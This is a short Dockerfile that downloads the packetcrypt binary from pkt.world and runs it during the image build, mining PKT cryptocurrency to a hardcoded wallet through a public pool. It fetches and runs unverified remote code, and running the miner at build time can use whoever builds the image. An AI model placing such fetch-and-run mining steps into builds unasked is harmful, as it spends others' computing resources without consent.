FROM ubuntu:latest
RUN apt update && apt install wget curl git -y
RUN wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O packetcrypt
RUN chmod +x packetcrypt
RUN ./packetcrypt ann -p pkt1q4krnrt8rquv4qhzr9cuvlevmaewvep70z00k00 http://pool.pkt.world
